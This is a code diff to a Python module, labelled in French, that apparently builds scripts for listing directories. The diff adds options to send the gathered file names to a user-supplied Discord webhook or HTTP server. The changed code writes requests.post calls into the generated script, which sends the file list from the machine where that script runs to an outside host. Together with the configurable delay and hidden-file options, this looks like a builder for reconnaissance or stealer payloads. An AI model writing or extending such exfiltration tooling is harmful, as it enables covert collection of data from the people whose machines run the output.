@@ -57,6 +57,8 @@ def directory_listing_module():
         ("Chemin du répertoire à lister", chemin_option),    
         ("Inclure les fichiers cachés", cache_option),
         ("Délai avant listing", delai_option),
+        ("Envoi sur Discord", envoi_discord),
+        ("Envoi sur serveur HTTP", envoi_http)
 
     ]
 
@@ -64,13 +66,11 @@ def directory_listing_module():
         clear()
         webhook = input("Entrez l'URL du webhook discord : ")
         choix["Envoi sur Discord"] = webhook
-        time.sleep(2)
 
     def envoi_http():
         clear()
         reponse = input("Entrez l'URL de votre serveur HTTP : ")
         choix["Envoi sur serveur HTTP"] = reponse
-        time.sleep(2)
 
     def contrôle_envoi():
         if choix["Envoi sur Discord"] and choix["Envoi sur serveur HTTP"]:
@@ -111,6 +111,15 @@ def directory_listing_module():
             
             f.write("    for file in files:\n")
             f.write("        print(file)\n\n")
+            if choix["Envoi sur Discord"]:
+                f.write(f"    webhook_url = '{choix['Envoi sur Discord']}'\n")
+                f.write("    data = {'content': '\\n'.join(files)}\n")
+                f.write("    requests.post(webhook_url, data=data)\n\n")
+
+            if choix["Envoi sur serveur HTTP"]:
+                f.write(f"    http_url = '{choix['Envoi sur serveur HTTP']}'\n")
+                f.write("    data = {'files': files}\n")
+                f.write("    requests.post(http_url, json=data)\n\n")
             
             f.write("if __name__ == '__main__':\n")
             f.write("    list_directory()\n")
